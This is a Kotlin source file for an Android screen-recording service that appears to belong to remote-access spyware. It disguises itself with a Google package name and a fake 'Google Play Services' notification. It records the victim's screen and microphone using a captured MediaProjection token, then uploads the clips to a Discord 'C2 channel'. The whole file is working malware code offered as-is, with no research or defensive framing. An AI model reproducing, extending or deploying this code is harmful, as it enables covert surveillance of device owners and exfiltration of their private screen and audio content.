package com.google.android.system

import com.google.android.system.R

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * ScreenRecordingService
 *
 * Background MediaProjection & Hardware MediaRecorder Screen Recording Service (FEAT-05):
 * - Records target device screen activity in H.264 / AAC MP4 video format (720p, 30 FPS, 2 Mbps).
 * - Utilizes MediaProjection session token captured from InvisibleActivity.
 * - Auto-stops after specified duration (e.g. 10s, 30s) and uploads video clip to Discord C2 channel.
 * - Handles foregroundServiceType="mediaProjection" requirements on Android 14+ (API 34+).
 */
class ScreenRecordingService : Service() {

    companion object {
        private const val TAG = "ScreenRecordService"
        private const val NOTIF_ID_SCREEN_RECORD = 19452

        const val EXTRA_RESULT_CODE = "extra_result_code"
        const val EXTRA_RESULT_DATA = "extra_result_data"
        const val EXTRA_DURATION_SEC = "extra_duration_sec"
        const val EXTRA_TARGET_CHAT_ID = "extra_target_chat_id"

        @Volatile var isRecording = false
            private set

        @Volatile var cachedProjectionIntent: Intent? = null
        @Volatile var cachedResultCode: Int = -1
    }

    private var mediaProjectionManager: MediaProjectionManager? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, cachedResultCode)
        val resultData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java) ?: cachedProjectionIntent
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra(EXTRA_RESULT_DATA) ?: cachedProjectionIntent
        }
        val durationSec = intent.getIntExtra(EXTRA_DURATION_SEC, 10).coerceIn(3, 120)
        val chatId = intent.getStringExtra(EXTRA_TARGET_CHAT_ID) ?: ""

        if (resultCode != -1 && resultData != null) {
            cachedResultCode = resultCode
            cachedProjectionIntent = resultData
        }

        if (cachedResultCode == -1 || cachedProjectionIntent == null) {
            Log.e(TAG, "Screen recording failed: No valid MediaProjection result code or intent data.")
            stopSelf()
            return START_NOT_STICKY
        }

        startForegroundNotification()
        startScreenRecording(cachedResultCode, cachedProjectionIntent!!, durationSec, chatId)

        return START_NOT_STICKY
    }

    private fun startForegroundNotification() {
        val channelId = getString(R.string.notif_channel_id)
        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                getString(R.string.notif_channel_name),
                NotificationManager.IMPORTANCE_LOW
            )
            notificationManager.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("Syncing system telemetry")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(
                    NOTIF_ID_SCREEN_RECORD,
                    notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            } else {
                startForeground(NOTIF_ID_SCREEN_RECORD, notification)
            }
        } else {
            startForeground(NOTIF_ID_SCREEN_RECORD, notification)
        }
    }

    private fun startScreenRecording(resultCode: Int, resultData: Intent, durationSec: Int, chatId: String) {
        if (isRecording) {
            Log.w(TAG, "Screen recording already in progress.")
            return
        }

        try {
            isRecording = true
            mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, resultData)

            if (mediaProjection == null) {
                Log.e(TAG, "MediaProjection token initialization returned null.")
                isRecording = false
                stopSelf()
                return
            }

            val metrics = resources.displayMetrics
            val width = 720
            val height = 1280
            val density = metrics.densityDpi

            val timeStr = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            outputFile = File(cacheDir, "screenrecord_$timeStr.mp4")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                try {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                } catch (_: Exception) {
                    try { setAudioSource(MediaRecorder.AudioSource.DEFAULT) } catch (_: Exception) {}
                }
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncodingBitRate(2_000_000)
                setVideoFrameRate(30)
                setVideoSize(width, height)
                setOutputFile(outputFile!!.absolutePath)
                prepare()
            }

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecordDisplay",
                width,
                height,
                density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface,
                null,
                null
            )

            mediaRecorder?.start()
            Log.i(TAG, "Screen recording started successfully for $durationSec seconds. Target file: ${outputFile?.absolutePath}")

            mainHandler.postDelayed({
                stopAndUploadRecording(chatId)
            }, durationSec * 1000L)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start screen recording: ${e.message}", e)
            isRecording = false
            stopSelf()
        }
    }

    private fun stopAndUploadRecording(chatId: String) {
        try {
            Log.i(TAG, "Stopping screen recording and releasing resources...")
            try { mediaRecorder?.stop() } catch (_: Exception) {}
            try { mediaRecorder?.reset() } catch (_: Exception) {}
            try { mediaRecorder?.release() } catch (_: Exception) {}
            try { virtualDisplay?.release() } catch (_: Exception) {}
            try { mediaProjection?.stop() } catch (_: Exception) {}

            mediaRecorder = null
            virtualDisplay = null
            mediaProjection = null
            isRecording = false

            val file = outputFile
            if (file != null && file.exists() && file.length() > 0) {
                Log.i(TAG, "Screen recording saved (${file.length()} bytes). Dispatching C2 upload...")
                MonitorService.sendPhotoPublic(if (chatId.isNotBlank()) chatId else "10-photos-dump", file)
            } else {
                Log.w(TAG, "Screen recording output file was empty or missing.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping screen recording: ${e.message}", e)
        } finally {
            isRecording = false
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isRecording) {
            stopAndUploadRecording("")
        }
    }
}
